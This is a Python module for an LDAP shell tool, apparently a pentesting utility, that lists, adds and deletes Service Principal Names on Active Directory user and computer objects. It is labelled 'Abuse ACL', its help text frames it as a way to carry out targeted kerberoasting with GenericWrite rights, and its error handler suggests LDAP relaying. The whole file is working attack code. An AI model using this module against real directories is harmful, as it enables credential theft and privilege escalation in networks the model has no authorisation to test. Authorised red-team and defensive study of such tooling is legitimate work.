import logging
from ldap3 import Connection, MODIFY_REPLACE, MODIFY_ADD, MODIFY_DELETE
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
from ldap_shell.utils.ldap_utils import LdapUtils

class LdapShellModule(BaseLdapModule):
    """Module for managing Service Principal Names (SPN) for target objects"""
    
    help_text = "List, add or delete SPN for a target object"
    examples_text = """
    If you have GenericWrite permissions on the object, you can perform a targeted kerberoasting attack.
    List SPNs for user john:
    `set_spn john list`
    ```
    [INFO] Current SPNs for john:
    [INFO] - HTTP/example.com
    [INFO] - MSSQLSvc/server.domain.local
    ```
    
    Add SPN for user john:
    `set_spn john add HTTP/example.com`
    ```
    [INFO] SPN HTTP/example.com added successfully
    ```
    
    Delete SPN for user john:
    `set_spn john del HTTP/example.com`
    ```
    [INFO] SPN HTTP/example.com deleted successfully
    ```
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target object (sAMAccountName)",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER]
        )
        action: str = Field(
            description="Action to perform (list/add/del)",
            arg_type=ArgumentType.ACTION
        )
        spn: str = Field(
            None,
            description="SPN to add or delete",
            arg_type=ArgumentType.STRING
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def __call__(self):
        try:
            # Get target DN
            target_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.target)
            if not target_dn:
                self.log.error(f'Target object not found: {self.args.target}')
                return

            # Get current SPNs
            if not self.client.search(target_dn, '(objectClass=*)', attributes=['servicePrincipalName']):
                self.log.error('Failed to get SPN attributes')
                return

            current_spns = []
            if self.client.entries and 'servicePrincipalName' in self.client.entries[0]:
                current_spns = self.client.entries[0]['servicePrincipalName'].values

            # Handle different actions
            if self.args.action.lower() == 'list':
                if not current_spns:
                    self.log.info(f'No SPNs found for {self.args.target}')
                    return
                
                self.log.info(f'Current SPNs for {self.args.target}:')
                for spn in current_spns:
                    self.log.info(f'- {spn}')
                return

            if not self.args.spn:
                self.log.error('SPN value is required for add/del actions')
                return

            if self.args.action.lower() == 'add':
                if self.args.spn in current_spns:
                    self.log.warning(f'SPN {self.args.spn} already exists')
                    return
                
                new_spns = current_spns + [self.args.spn]
                result = self.client.modify(
                    target_dn,
                    {'servicePrincipalName': [(MODIFY_REPLACE, new_spns)]}
                )
                
                if result:
                    self.log.info(f'SPN {self.args.spn} added successfully')
                else:
                    self.log.error(f'Failed to add SPN: {self.client.result["description"]}')

            elif self.args.action.lower() == 'del':
                if self.args.spn not in current_spns:
                    self.log.warning(f'SPN {self.args.spn} does not exist')
                    return
                
                new_spns = [spn for spn in current_spns if spn != self.args.spn]
                result = self.client.modify(
                    target_dn,
                    {'servicePrincipalName': [(MODIFY_REPLACE, new_spns)]}
                )
                
                if result:
                    self.log.info(f'SPN {self.args.spn} deleted successfully')
                else:
                    self.log.error(f'Failed to delete SPN: {self.client.result["description"]}')
            else:
                self.log.error('Invalid action. Use list/add/del')

        except Exception as e:
            self.log.error(f'Error managing SPNs: {str(e)}')
            if 'insufficient access rights' in str(e).lower():
                self.log.info('Try relaying with LDAPS (--use-ldaps) or use elevated credentials')
